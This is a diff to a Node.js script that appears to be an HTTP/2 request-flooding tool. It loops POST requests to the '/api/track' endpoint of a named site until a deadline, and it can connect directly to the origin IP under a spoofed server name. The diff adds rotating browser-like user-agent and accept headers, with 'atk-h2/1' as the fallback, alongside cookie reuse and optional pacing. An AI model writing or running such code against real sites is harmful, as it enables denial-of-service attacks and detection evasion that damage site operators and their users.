@@ -179,14 +179,16 @@ async function h2run(){
     const ready=()=>new Promise(r=>{conn=http2.connect(DIRECT?'https://'+IP:'https://velor.win',{servername:HOST,localAddress:LOCAL||undefined});conn.once('connect',r);conn.once('error',r);});
     await ready();
     while(Date.now()<endAt){
+      const t0w=Date.now();
       try{
         sent++;
-        const st=conn.request({':method':'POST',':path':'/api/track',':authority':HOST,'content-type':'application/json',...(freshCookie()?{cookie:freshCookie()}:{})});
+        const st=conn.request({':method':'POST',':path':'/api/track',':authority':HOST,'content-type':'application/json','user-agent':freshUA()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(freshCookie()?{cookie:freshCookie()}:{})});
         const p=new Promise(res=>{st.on('response',h=>{st.resume();res(h[':status']);});st.on('error',()=>res('E'));st.on('close',()=>res('ABORT'));});
         st.write(MODE==='h2trk'?FAT:tiny); st.end();
         const c=await p; codes[c]=(codes[c]||0)+1;
         if(c==='E'||c==='ABORT'){abort++;try{conn.close();}catch(e){} await ready();}
       }catch(e){abort++;try{conn.close();}catch(_){} await ready();}
+      if(PACE>0){const el=Date.now()-t0w; if(el<PACE)await new Promise(r=>setTimeout(r,PACE-el));}
     }
     try{conn.close();}catch(e){}
   };
